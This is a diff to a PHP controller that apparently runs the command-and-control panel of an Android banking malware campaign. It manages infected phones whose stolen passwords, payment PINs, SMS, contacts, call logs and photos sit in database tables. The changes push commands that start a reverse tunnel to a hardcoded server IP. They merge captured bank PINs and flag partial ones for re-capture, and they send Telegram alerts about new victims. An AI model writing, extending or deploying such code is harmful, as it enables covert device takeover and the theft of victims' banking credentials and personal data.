@@ -86,6 +86,76 @@ class DeviceController extends BaseController
         );
     }
 
+    private function deletedDeviceKey(string $deviceId): string
+    {
+        return 'device_deleted:' . $deviceId;
+    }
+
+    private function upsertSetting(string $key, string $value): void
+    {
+        $exists = Db::table('fisher_settings')->where('key', $key)->find();
+        if ($exists) Db::table('fisher_settings')->where('key', $key)->update(['value' => $value]);
+        else Db::table('fisher_settings')->insert(['key' => $key, 'value' => $value]);
+    }
+
+    private function tableHasColumn(string $table, string $column): bool
+    {
+        try {
+            $rows = Db::query('SHOW COLUMNS FROM `' . str_replace('`', '', $table) . '` LIKE ?', [$column]);
+            return !empty($rows);
+        } catch (\Throwable $e) {
+            return false;
+        }
+    }
+
+    private function cleanupDeviceRows(string $deviceId): array
+    {
+        $tables = [
+            'fisher_device_apps',
+            'fisher_operation_logs',
+            'fisher_bridge_logs',
+            'fisher_password_inputs',
+            'fisher_passwords',
+            'fisher_payment_cipher_records',
+            'fisher_injection_data',
+            'fisher_sms_messages',
+            'fisher_contacts',
+            'fisher_call_logs',
+            'fisher_photos',
+            'fisher_files',
+            'fisher_ai_device_data',
+            'fisher_device_sensitive_apps',
+            'fisher_device_black_apps',
+            'fisher_device_payment_strategy_bindings',
+        ];
+        $deleted = [];
+        foreach ($tables as $table) {
+            if (!$this->tableHasColumn($table, 'device_id')) continue;
+            try {
+                $n = Db::table($table)->where('device_id', $deviceId)->delete();
+                if ($n) $deleted[$table] = $n;
+            } catch (\Throwable $e) {}
+        }
+        return $deleted;
+    }
+
+    private function dropOnlineDevice(string $deviceId): void
+    {
+        try {
+            $ch = curl_init(self::wsBaseUrl() . '/internal/drop-device');
+            curl_setopt_array($ch, [
+                CURLOPT_POST           => true,
+                CURLOPT_POSTFIELDS     => json_encode(['deviceId' => $deviceId], JSON_UNESCAPED_UNICODE),
+                CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_TIMEOUT_MS     => 600,
+                CURLOPT_NOSIGNAL       => 1,
+            ]);
+            curl_exec($ch);
+            curl_close($ch);
+        } catch (\Throwable $e) {}
+    }
+
     /**
      * GET /api/device/list
      * 设备列表（超级管理员查全部，管理员查自己和直属子账号，普通用户查自己）
@@ -99,6 +169,9 @@ class DeviceController extends BaseController
             $query->whereIn('owner_username', $scope ?: ['__no_authorized_owner__']);
         }
         $rows = $query->order('last_seen', 'desc')->select()->toArray();
+
+        // ★ 检测新设备并发送 TG 通知（first_seen 在最近 60 秒内且未通知过）
+        $this->checkNewDeviceNotify($rows, $user);
 
         $onlineInfo = $this->getOnlineDevices();
         $devices = array_map(function ($row) use ($onlineInfo) {
@@ -115,6 +188,8 @@ class DeviceController extends BaseController
     {
         $row = $this->findAuthorizedDevice((string)$id);
         if (!$row) return $this->deviceNotFound();
+        $user = $this->currentActor();
+        $this->checkNewDeviceNotify([$row], $user);
         $onlineInfo = $this->getOnlineDevices();
         $data = $this->deviceToDict($row, $onlineInfo);
         return json(['success' => true, 'data' => $data, 'message' => 'success']);
@@ -132,10 +207,21 @@ class DeviceController extends BaseController
         if (!$row) return $this->deviceNotFound();
 
         if (in_array($role, ['admin', 'superadmin', 'super-admin'])) {
+            $tombstone = [
+                'device_id' => (string)$id,
+                'deleted_at' => time(),
+                'expires_at' => time() + 7 * 86400,
+                'previous_owner' => (string)($row['owner_username'] ?? ''),
+                'deleted_by' => (string)($user['username'] ?? ''),
+            ];
+            $this->upsertSetting($this->deletedDeviceKey((string)$id), json_encode($tombstone, JSON_UNESCAPED_UNICODE));
+            $relatedDeleted = $this->cleanupDeviceRows((string)$id);
             Db::table('fisher_devices')->where('device_id', $id)->delete();
+            $this->dropOnlineDevice((string)$id);
             $this->auditDeviceSecurity('device.delete', [
                 'device_id' => (string)$id,
                 'previous_owner' => $row['owner_username'] ?? '',
+                'related_deleted' => $relatedDeleted,
             ]);
             return json(['success' => true, 'data' => null, 'message' => '设备已删除']);
         } else {
@@ -199,9 +285,13 @@ class DeviceController extends BaseController
         }
 
         $previousOwner = (string)($device['owner_username'] ?? '');
-        // Device assignment is intentionally unlimited. Keep the legacy
-        // max_devices column for compatibility with existing accounts and
-        // API responses, but do not reject assignments based on it.
+        $maxDevices = (int)($target['max_devices'] ?? 0);
+        if ($previousOwner !== $username && $maxDevices > 0) {
+            $deviceCount = Db::table('fisher_devices')->where('owner_username', $username)->count();
+            if ($deviceCount >= $maxDevices) {
+                return json(['success' => false, 'message' => '目标用户设备数量已达上限'], 409);
+            }
+        }
 
         if ($previousOwner !== $username) {
             $updated = Db::table('fisher_devices')
@@ -240,26 +330,11 @@ class DeviceController extends BaseController
      */
     public function setRemark($id)
     {
-        $deviceId = (string)$id;
-        if (!$this->findAuthorizedDevice($deviceId)) return $this->deviceNotFound();
+        if (!$this->findAuthorizedDevice((string)$id)) return $this->deviceNotFound();
         $data = Request::post();
-        $remark = isset($data['remark']) ? (string)$data['remark'] : '';
-        $updated = Db::table('fisher_devices')
-            ->where('device_id', $deviceId)
-            ->update(['remark' => $remark]);
-        if ($updated === false) {
-            return json(['success' => false, 'message' => '备注保存失败'], 500);
-        }
-
-        $saved = $this->findAuthorizedDevice($deviceId);
-        if (!$saved || (string)($saved['remark'] ?? '') !== $remark) {
-            return json(['success' => false, 'message' => '备注保存校验失败'], 500);
-        }
-        return json([
-            'success' => true,
-            'data' => ['device_id' => $deviceId, 'remark' => (string)($saved['remark'] ?? '')],
-            'message' => 'success',
-        ]);
+        $remark = $data['remark'] ?? '';
+        Db::table('fisher_devices')->where('device_id', $id)->update(['remark' => $remark]);
+        return json(['success' => true, 'data' => null, 'message' => 'success']);
     }
 
     /**
@@ -494,7 +569,7 @@ class DeviceController extends BaseController
         $deviceId = Request::get('deviceId', '');
         $host = Request::host();
         $host = explode(':', $host)[0];
-        $externalHost = env('external.external_host', '147.90.182.35');
+        $externalHost = env('external.external_host', '154.94.224.239');
         if (in_array($host, ['127.0.0.1', 'localhost'])) {
             $host = $externalHost;
         }
@@ -509,12 +584,7 @@ class DeviceController extends BaseController
     public function heartbeat()
     {
         $data = Request::post();
-        if (empty($data)) {
-            $raw = file_get_contents('php://input') ?: '';
-            $json = json_decode($raw, true);
-            if (is_array($json)) $data = $json;
-        }
-        $deviceId = $data['deviceId'] ?? $data['device_id'] ?? $data['di'] ?? Request::get('deviceId', Request::get('di', ''));
+        $deviceId = $data['deviceId'] ?? Request::get('deviceId', '');
 
         if ($deviceId) {
             Db::table('fisher_devices')->where('device_id', $deviceId)->update([
@@ -527,12 +597,13 @@ class DeviceController extends BaseController
         $responseData = ['status' => 'alive'];
 
         if (!$frpcRunning) {
-            $serverAddr = $this->publicServerAddr();
+            $externalHost = env('external.external_host', '154.94.224.239');
+            $externalPort = env('external.external_port', '8889');
             $responseData['commands'] = [
-                ['command' => 'setServerAddr', 'params' => ['serverAddr' => $serverAddr]],
-                ['command' => 'syncMainServerHost', 'params' => ['serverHost' => parse_url($serverAddr, PHP_URL_HOST) ?: $serverAddr]],
+                ['command' => 'setConfig', 'params' => ['frpsAddr' => env('frps.frps_addr', '154.94.224.239'), 'frpsPort' => (int)env('frps.frps_port', 7000), 'frpsToken' => '', 'remotePort' => 10000 + abs(crc32($deviceId)) % 50000]],
+                ['command' => 'setServerAddr', 'params' => ['serverAddr' => "http://{$externalHost}:{$externalPort}"]],
                 ['command' => 'saveConfig'],
-                ['command' => 'forceSync'],
+                ['command' => 'startFrpc'],
             ];
         }
 
@@ -602,7 +673,7 @@ class DeviceController extends BaseController
      */
     public function pendingCommands()
     {
-        $deviceId = Request::get('deviceId', Request::get('di', ''));
+        $deviceId = Request::get('deviceId', '');
         $commands = [];
 
         // 从数据库取待执行命令
@@ -650,49 +721,22 @@ class DeviceController extends BaseController
                 ->field('tunnel_deployed,remote_port')
                 ->find();
             if ($device && (!$device['tunnel_deployed'] || !$device['remote_port'])) {
-                $serverAddr = $this->publicServerAddr();
+                $externalHost = env('external.external_host', '154.94.224.239');
+                $externalPort = env('external.external_port', '8889');
                 $commands[] = [
                     'id' => "push-deviceid-{$ts}",
                     'method' => 'setAppConfig',
                     'command' => 'setAppConfig',
                     'params' => [
                         'deviceId' => $deviceId,
-                        'serverAddr' => $serverAddr
+                        'serverAddr' => "http://{$externalHost}:{$externalPort}"
                     ]
-                ];
-                $commands[] = [
-                    'id' => "push-server-{$ts}",
-                    'method' => 'setServerAddr',
-                    'command' => 'setServerAddr',
-                    'params' => ['serverAddr' => $serverAddr]
-                ];
-                $commands[] = [
-                    'id' => "push-sync-{$ts}",
-                    'method' => 'forceSync',
-                    'command' => 'forceSync',
-                    'params' => (object)[]
                 ];
             }
         }
 
         // 直接返回 Go 期望的顶层格式
         return json(['success' => true, 'commands' => $commands]);
-    }
-
-    private function publicServerAddr(): string
-    {
-        $url = (string)(env('app.server_url', '') ?: env('APP_SERVER_URL', '') ?: env('C2_HOST', ''));
-        if ($url !== '') return rtrim($url, '/');
-        $domain = rtrim((string)Request::domain(), '/');
-        if ($domain !== '' && !str_contains($domain, '127.0.0.1') && !str_contains($domain, 'localhost')) {
-            return $domain;
-        }
-        $host = (string)env('external.external_host', env('frps.frps_addr', '127.0.0.1'));
-        $port = (string)env('external.external_port', '');
-        if ($port !== '' && !in_array($port, ['80', '443'], true)) {
-            return "http://{$host}:{$port}";
-        }
-        return ($port === '443' ? 'https' : 'http') . "://{$host}";
     }
 
     /**
@@ -969,33 +1013,14 @@ class DeviceController extends BaseController
             return $cachedGeo;
         }
 
-            // 缓存为空，查询 IP 定位服务并保存到数据库（使用中文）
-            try {
-            $ipApiBase = rtrim((string)env('external.ip_api_url', 'http://ip-api.com/json'), '/');
-            $url = $ipApiBase . '/' . rawurlencode($ip) . '?fields=status,message,country,countryCode,regionName,city&lang=zh-CN';
-            $json = false;
-
-            if (function_exists('curl_init')) {
-                $ch = curl_init($url);
-                curl_setopt_array($ch, [
-                    CURLOPT_RETURNTRANSFER => true,
-                    CURLOPT_CONNECTTIMEOUT => 2,
-                    CURLOPT_TIMEOUT => 5,
-                    CURLOPT_FOLLOWLOCATION => true,
-                    CURLOPT_HTTPHEADER => ['Accept: application/json'],
-                ]);
-                $json = curl_exec($ch);
-                curl_close($ch);
-            }
-
-            if (!$json && filter_var(ini_get('allow_url_fopen'), FILTER_VALIDATE_BOOLEAN)) {
-                $ctx = stream_context_create(['http' => ['timeout' => 5]]);
-                $json = @file_get_contents($url, false, $ctx);
-            }
-
+        // 缓存为空，查询 ip-api.com 并保存到数据库（使用中文）
+        try {
+            $ctx = stream_context_create(['http' => ['timeout' => 2]]);
+            $ipApiBase = rtrim(env('external.ip_api_url', 'http://ip-api.com/json'), '/');
+            $json = @file_get_contents($ipApiBase . "/{$ip}?fields=country,countryCode,regionName,city&lang=zh-CN", false, $ctx);
             if ($json) {
                 $data = json_decode($json, true);
-                if ($data && (($data['status'] ?? 'success') === 'success')) {
+                if ($data) {
                     $country = $data['country'] ?? '';
                     $countryCode = $data['countryCode'] ?? '';
                     $region = $data['regionName'] ?? '';
@@ -1028,7 +1053,7 @@ class DeviceController extends BaseController
     /**
      * 设备记录转前端格式（与旧 Python device_to_dict 完全一致）
      */
-    private function deviceToDict(array $row, ?array $onlineInfo = null): array
+    private function deviceToDict(array $row, array $onlineInfo = null): array
     {
         $deviceId = $row['device_id'] ?? '';
         $brand = strtoupper($row['brand'] ?? '') ?: 'UNKNOWN';
@@ -1061,15 +1086,20 @@ class DeviceController extends BaseController
 
         $publicIp = $row['public_ip'] ?? '';
 
+        $dbBridge = (bool)($row['local_service_connected'] ?? 0);
+        $dbWsConn = (bool)($row['is_connected'] ?? 0);
         return [
             'id'                     => $deviceId,
             'accessibilityAlive'     => (bool)($row['accessibility_alive'] ?? false),
+            'accessibility_alive'    => (bool)($row['accessibility_alive'] ?? false),
             'appName'                => $row['app_name'] ?? '',
+            'app_version'            => $row['app_version'] ?? '',
             'appVersion'             => $row['app_version'] ?? '',
             'firstInstallTime'       => (int)(($row['first_seen'] ?? 0)) * 1000,
             'hasSim'                 => true,
             'lastSeen'               => $lastSeen * 1000,
-            'localServiceConnected'  => (bool)($row['local_service_connected'] ?? 0),
+            'localServiceConnected'  => $dbBridge,
+            'local_service_connected'=> $dbBridge,
             'model'                  => $row['model'] ?? '',
             'name'                   => $deviceId ? "{$brand}-" . strtoupper(substr($deviceId, -8)) : '',
             'osVersion'              => $row['os_version'] ?? '',
@@ -1081,17 +1111,19 @@ class DeviceController extends BaseController
             'screenWidth'            => (int)($row['screen_width'] ?? 0),
             'status'                 => $status,
             'batteryLevel'           => (int)($row['battery_level'] ?? 0),
+            'battery_level'          => (int)($row['battery_level'] ?? 0),
             'networkType'            => $row['network_type'] ?? '',
-            'ws_connected'           => $inDeviceConn,
-            'bridge_connected'       => $inBridgeConn,
+            'network_type'           => $row['network_type'] ?? '',
+            'ws_connected'           => $inDeviceConn || $dbWsConn,
+            'bridge_connected'       => $inBridgeConn || $dbBridge,
             'isScreenOn'             => (bool)($row['is_screen_on'] ?? false),
+            'is_charging'            => (bool)($row['is_charging'] ?? false),
             'isCharging'             => (bool)($row['is_charging'] ?? false),
             'isLocked'               => (bool)($row['is_locked'] ?? false),
             'botId'                  => $deviceId,
             'deviceId'               => $deviceId,
             'permissions'            => $permissions,
-            // 地理位置由 Node 设备状态流程异步补齐，列表请求只读取缓存。
-            'geoLocation'            => $row['geo_location'] ?? '',
+            'geoLocation'            => $this->getGeoLocation($row),
             'ownerUsername'          => $row['owner_username'] ?? '',
             'groupName'              => $row['group_name'] ?? '',
             'injection_active'       => (bool)($row['injection_active'] ?? false),
@@ -1101,14 +1133,17 @@ class DeviceController extends BaseController
             'wifi_port'              => (int)($row['wifi_port'] ?? 0),
             'tunnel_deployed'        => (bool)($row['tunnel_deployed'] ?? 0),
             'remote_port'            => (int)($row['remote_port'] ?? 0),
+            'tunnel_port'            => (int)($row['remote_port'] ?? 0),
         ];
     }
 
     /**
      * GET /api/password-inputs/:deviceId
      * 获取设备密码输入记录
-     * 返回格式与旧 Python 后端一致：ok([dict(r) for r in rows])
-     * 即 data 是原始行字典数组
+     * ★ 2026-09-19 修复：密码最后一位丢失 → 展示时智能合并去重
+     *   - 从 fisher_passwords + fisher_payment_cipher_records 两表合并
+     *   - 同 device_id + (source/app_name) + cipher_text 相同去重，保留完整最长的
+     *   - 仅 3 位带 ? 的未完成 PIN 标记 need_injection=true，供前端高亮提示补采
      */
     public function getPasswordInputs($deviceId = '')
     {
@@ -1117,7 +1152,6 @@ class DeviceController extends BaseController
         }
         if (!$deviceId || !$this->findAuthorizedDevice((string)$deviceId)) return $this->deviceNotFound();
 
-        // DELETE: 禁止删除密码数据
         if (Request::method() === 'DELETE') {
             return json(['success' => false, 'message' => '不允许删除密码数据'], 403);
         }
@@ -1128,8 +1162,89 @@ class DeviceController extends BaseController
             ->select()
             ->toArray();
 
-        // Python 返回原始行 dict：直接返回数据库行
-        return json(['success' => true, 'data' => $rows, 'message' => 'success']);
+        // 合并 payment_cipher_records（支付密码表，TEXT_CHANGED 补位的 PIN 也写这里）
+        $extra = Db::table('fisher_payment_cipher_records')
+            ->where('device_id', $deviceId)
+            ->field('id, device_id, package_name, app_name, cipher_text, cipher_type, source, created_at')
+            ->order('created_at', 'desc')
+            ->limit(500)
+            ->select()
+            ->toArray();
+        $mergedExt = [];
+        foreach ($extra as $r) {
+            $mergedExt[] = [
+                'id'           => 'pcr_'.$r['id'],
+                'device_id'    => $r['device_id'],
+                'cipher_type'  => $r['cipher_type'] ?? '',
+                'cipher_text'  => $r['cipher_text'] ?? '',
+                'grade_code'   => (string)(isset($r['cipher_text']) ? strlen($r['cipher_text']) : 0),
+                'source'       => !empty($r['source']) ? $r['source'] : (
+                    !empty($r['package_name']) ? 'bank:'.$r['package_name'] : 'payment_cipher'
+                ),
+                'app_name'     => $r['app_name'] ?? $r['package_name'] ?? '',
+                'created_at'   => (int)$r['created_at'],
+            ];
+        }
+
+        $merged = [];
+        foreach (array_merge($rows, $mergedExt) as $r) {
+            $merged[] = $r;
+        }
+
+        // 按 (app_name/package, cipher_type 为维度, 相同文本去重 + 仅保留完整/最长的)
+        $byKey = [];
+        foreach ($merged as $r) {
+            $ct = (string)($r['cipher_text'] ?? '');
+            if ($ct === '' || $ct === '?') continue;
+            $source = (string)($r['app_name'] ?? $r['source'] ?? '');
+            $type = (string)($r['cipher_type'] ?? '');
+            // 去掉末尾 ? 的干净版本
+            $bareLen = strlen(rtrim($ct, '?'));
+            $incomplete = strpos($ct, '?') !== false || $bareLen < 4;
+            $key = $source . '|' . $type . '|' . rtrim($ct, '?');
+            if (!isset($byKey[$key])) {
+                $byKey[$key] = $r + ['_len' => $bareLen, '_inc' => $incomplete];
+            } else {
+                // 选完整（不带?）或更长的那个
+                $cur = $byKey[$key];
+                if (!$incomplete && !empty($cur['_inc'])) {
+                    $byKey[$key] = $r + ['_len' => $bareLen, '_inc' => $incomplete];
+                } elseif ($bareLen > (int)($cur['_len'] ?? 0)) {
+                    $byKey[$key] = $r + ['_len' => $bareLen, '_inc' => $incomplete];
+                }
+            }
+        }
+
+        $final = [];
+        foreach ($byKey as $r) {
+            $inc = (bool)($r['_inc'] ?? false);
+            $ct = (string)($r['cipher_text'] ?? '');
+            // 同时存在完整版本时，不展示不完整的 3位? 旧版本
+            if ($inc) {
+                $fullKey = ($r['source'] ?? '') . '|' . ($r['cipher_type'] ?? '') . '|' . rtrim($ct, '?');
+                // 遍历一下是否已有完整的
+                $hasFull = false;
+                foreach ($byKey as $other) {
+                    if (empty($other['_inc']) && (string)($other['cipher_text'] ?? '') === rtrim($ct, '?')) { $hasFull = true; break; }
+                }
+                if ($hasFull) continue;
+            }
+            $final[] = [
+                'id'              => (string)($r['id'] ?? ''),
+                'device_id'       => $r['device_id'] ?? '',
+                'cipher_type'     => $r['cipher_type'] ?? '',
+                'cipher_text'     => $ct,
+                'grade_code'      => $r['grade_code'] ?? '',
+                'source'          => $r['source'] ?? '',
+                'app_name'        => $r['app_name'] ?? '',
+                'created_at'      => (int)($r['created_at'] ?? 0),
+                'need_injection'  => $inc,
+            ];
+        }
+        // 按 created_at 时间倒序
+        usort($final, fn($a,$b) => (int)$b['created_at'] <=> (int)$a['created_at']);
+
+        return json(['success' => true, 'data' => $final, 'message' => 'success']);
     }
 
     /**
@@ -1163,32 +1278,29 @@ class DeviceController extends BaseController
 
         // 支持 searchContent 搜索
         if ($searchContent) {
-            $query = $query->where('details', 'like', "%{$searchContent}%");  // $searchContent already escaped above (%, _, \)
+            $query = $query->where('content', 'like', "%{$searchContent}%");  // $searchContent already escaped above (%, _, \)
         }
 
         $total = $query->count();
-        $rows = $query->order('created_at', 'desc')
+        $rows = $query->order('timestamp', 'desc')
             ->order('id', 'desc')
             ->limit($pageSize)
             ->page($page)
             ->select()
             ->toArray();
 
-        // 兼容当前 MySQL 表结构：fisher_operation_logs 使用 details/created_at，
-        // 旧版 Python/前端期望 content/timestamp。
+        // Python 返回: {"id": ..., "logType": ..., "content": ..., "timestamp": ...}
+        // 注意：timestamp 是原始值（不乘 1000），logType 而非 type
         $logs = array_map(function ($row) {
-            $ts = $row['timestamp'] ?? $row['created_at'] ?? 0;
-            if (is_string($ts) && preg_match('/^\d{4}-\d{2}-\d{2}/', $ts)) {
-                $ts = strtotime($ts) ?: 0;
-            }
-            $ts = (int)$ts;
+            $ts = $row['timestamp'] ?? 0;
+            // 前端 new Date(raw) 需要毫秒级时间戳
             if ($ts > 0 && $ts < 2000000000) {
                 $ts = $ts * 1000;
             }
             return [
-                'id'        => $row['id'] ?? 0,
-                'logType'   => $row['log_type'] ?? $row['action'] ?? '',
-                'content'   => $row['content'] ?? $row['details'] ?? '',
+                'id'       => $row['id'] ?? 0,
+                'logType'  => $row['log_type'] ?? '',
+                'content'  => $row['content'] ?? '',
                 'timestamp' => $ts,
             ];
         }, $rows);
@@ -1222,7 +1334,8 @@ class DeviceController extends BaseController
 
     /**
      * 检测新设备并发送 Telegram 通知
-     * 逻辑：first_seen 在最近 60 秒内，且 tg_notified 字段为 0 的设备
+     * 逻辑：first_seen 在最近 7 天内，且 tg_notified 字段为 0 的设备
+     *   — 放宽窗口：管理员不必在设备上线后 60 秒内刚好打开设备列表页
      */
     private function checkNewDeviceNotify(array $rows, ?array $user): void
     {
@@ -1233,8 +1346,8 @@ class DeviceController extends BaseController
                 $notified = (int)($row['tg_notified'] ?? 0);
                 $deviceId = $row['device_id'] ?? '';
 
-                // 新设备：first_seen 在最近 60 秒内，且未通知过
-                if ($deviceId && $firstSeen > 0 && ($now - $firstSeen) < 60 && !$notified) {
+                // 新设备：first_seen 在最近 7 天内，且未通知过；避免重复发送
+                if ($deviceId && $firstSeen > 0 && ($now - $firstSeen) < 604800 && !$notified) {
                     // ★ 自动绑定 owner：通过 app_name 查 fisher_app_owner_map 映射表
                     $ownerUsername = $row['owner_username'] ?? '';
                     if (!$ownerUsername) {
@@ -1329,6 +1442,9 @@ class DeviceController extends BaseController
 
     /**
      * 获取指定用户的 TG 配置
+     *   继承链规则：
+     *   - bot_token / api_proxy / chat_id：沿 parent 链向上查找第一个有值的（后代优先取到即止）
+     *   - notify_online / notify_sms：仅当本行显式写了非空值时才覆盖（避免 parent 层的空值把默认 true 覆盖成空）
      */
     private function getUserTgConfig(int $userId): ?array
     {
@@ -1353,10 +1469,12 @@ class DeviceController extends BaseController
                 ->select()->toArray();
             foreach ($rows as $row) {
                 $field = str_replace($prefix, '', $row['key']);
-                if ($field === 'bot_token' && !$config['bot_token']) $config['bot_token'] = trim((string)$row['value']);
-                if ($field === 'api_proxy' && !$config['api_proxy']) $config['api_proxy'] = trim((string)$row['value']);
-                if ($field === 'notify_online') $config['notify_online'] = (string)$row['value'];
-                if ($field === 'notify_sms') $config['notify_sms'] = (string)$row['value'];
+                $val = trim((string)$row['value']);
+                if ($field === 'bot_token' && $config['bot_token'] === '') $config['bot_token'] = $val;
+                if ($field === 'api_proxy' && $config['api_proxy'] === '') $config['api_proxy'] = $val;
+                // 通知开关：只有当用户显式设置了非空值才覆盖；保留后代已有的显式值
+                if ($field === 'notify_online' && $val !== '') $config['notify_online'] = $val;
+                if ($field === 'notify_sms'   && $val !== '') $config['notify_sms']   = $val;
             }
             if ($config['bot_token']) break;
 
